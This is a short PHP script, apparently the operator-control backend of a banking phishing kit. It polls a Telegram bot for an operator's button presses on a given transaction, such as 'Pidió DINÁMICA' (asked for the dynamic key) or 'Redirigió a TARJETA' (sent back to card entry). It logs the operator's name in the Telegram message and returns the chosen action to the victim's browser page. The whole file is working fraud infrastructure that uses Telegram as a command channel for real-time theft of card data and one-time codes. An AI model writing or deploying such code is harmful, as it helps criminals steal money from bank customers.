<?php
session_start();
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';
$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId'] ?? '';

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['action' => null]);
    exit;
}

$botToken = $config['bot_token'];
$chatId   = $config['chat_id'];
$offset   = $_SESSION['last_update_id'] ?? 0;

$ch = curl_init("https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);
$action = null;

foreach ($data['result'] ?? [] as $update) {
    if (isset($update['update_id'])) {
        $_SESSION['last_update_id'] = $update['update_id'];
    }

    if (!isset($update['callback_query'])) continue;

    $callback = $update['callback_query'];
    if (strpos($callback['data'], $transactionId) === false) continue;

    list($actionType, ) = explode(':', $callback['data']);
    $action = $actionType;

    // Obtener mensaje original
    $msg        = $callback['message'] ?? [];
    $origText   = $msg['text'] ?? '';
    $origChatId = $msg['chat']['id'] ?? $chatId;
    $origMsgId  = $msg['message_id'] ?? $messageId;

    // Usuario que pulsó
    $from     = $callback['from'] ?? [];
    $operador = !empty($from['username']) ? '@' . $from['username'] :
                (trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? '')) ?: 'Operador');

    $acciones = [
        'error_logo'        => 'Marcó ERROR DE LOGO',
        'pedir_dinamica'    => 'Pidió DINÁMICA',
        'error_tc'          => 'Redirigió a TARJETA',
        'confirm_finalizar' => 'FINALIZÓ la operación'
    ];
    $accionHumana = $acciones[$actionType] ?? 'Acción desconocida';

    // Editar mensaje con acción
    if ($origText !== '') {
        $newText  = $origText;
        $newText .= "\n\n————————————\n";
        $newText .= "✅ Acción: <b>{$accionHumana}</b>\n";
        $newText .= "👤 Operador: <b>{$operador}</b>";

        $editPayload = [
            'chat_id'    => $origChatId,
            'message_id' => $origMsgId,
            'text'       => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $chEdit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
        curl_setopt($chEdit, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chEdit, CURLOPT_POST, true);
        curl_setopt($chEdit, CURLOPT_POSTFIELDS, json_encode($editPayload));
        curl_setopt($chEdit, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($chEdit);
        curl_close($chEdit);
    }

    break;
}

echo json_encode(['action' => $action]);
